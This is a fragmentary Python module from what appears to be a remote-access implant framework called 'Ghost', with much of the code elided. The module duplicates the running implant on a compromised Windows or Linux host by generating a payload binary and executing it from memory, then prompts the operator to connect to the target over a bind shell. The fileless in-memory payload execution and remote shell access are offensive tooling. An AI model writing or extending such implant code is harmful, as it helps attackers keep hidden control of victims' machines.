...
# Ghost is under the BSD 3-Clause license. see the LICENSE
...
from ghost.modules.lib.windows.memory_exec import exec_pe
from ghost.modules.lib.linux.exec_elf import mexec

from ghost.cli import ghostgen

__class_name__ = 'MemoryDuplicate'


@config(compatibilities=["windows", "linux"], category="manage")
class MemoryDuplicate(GhostModule):
    """
        Duplicate the current ghost payload by executing it from memory
    """
    interactive = 1
    dependencies = {
        'linux': ['memexec'],
    ...
    def run(self, args):
        ...
        payload, tpl, _ = ghostgen.generate_binary_from_template(
        ...
        self.success("ghost payload executed from memory")
        if launcherType == 'bind':
            self.success(
                'You have to connect to the target manually on {0}: '
                'try "connect --host {0}" in ghost shell'.format(
